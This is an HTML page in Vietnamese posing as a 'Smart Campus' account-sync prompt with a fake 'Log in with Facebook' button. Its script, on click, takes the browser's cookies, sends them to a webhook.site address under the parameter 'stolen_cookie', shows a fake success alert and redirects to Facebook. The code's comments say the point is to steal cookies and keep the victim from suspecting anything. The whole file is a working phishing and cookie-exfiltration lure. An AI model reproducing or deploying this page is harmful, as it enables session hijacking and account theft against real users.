<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Thực Người Dùng</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 360px; }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { color: #1c1e21; margin-bottom: 10px; }
        p { color: #606770; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
        .btn-fb:hover { background-color: #166fe5; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo" alt="FB">
        <h2>Smart Campus </h2>
        <p>Vui lòng xác thực tài khoản để đồng bộ dữ liệu của bạn </p>
        <button class="btn-fb" id="loginBtn">Đăng nhập bằng Facebook</button>
    </div>

<script>
    // Cấu hình Webhook của bạn
    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";

    document.getElementById('loginBtn').onclick = function() {
        // 1. Kỹ thuật cướp Cookie: Bốc toàn bộ dữ liệu xác thực trong trình duyệt
        const cookies = document.cookie;
        
        // 2. Mã hóa dữ liệu để tránh lỗi ký tự khi gửi qua URL
        const encodedCookie = encodeURIComponent(cookies);

        // 3. Gửi Cookie về Webhook ngầm
        fetch(`${WEBHOOK_URL}?stolen_cookie=${encodedCookie}`)
        .then(() => {
            // Thông báo giả để xóa dấu vết
            alert("Đồng bộ thành công! Hệ thống đang chuyển hướng...");
            window.location.href = "https://www.facebook.com";
        })
        .catch(() => {
            // Nếu trình duyệt chặn, vẫn chuyển hướng để nạn nhân không nghi ngờ
            window.location.href = "https://www.facebook.com";
        });
    };
</script>
</body>
</html>
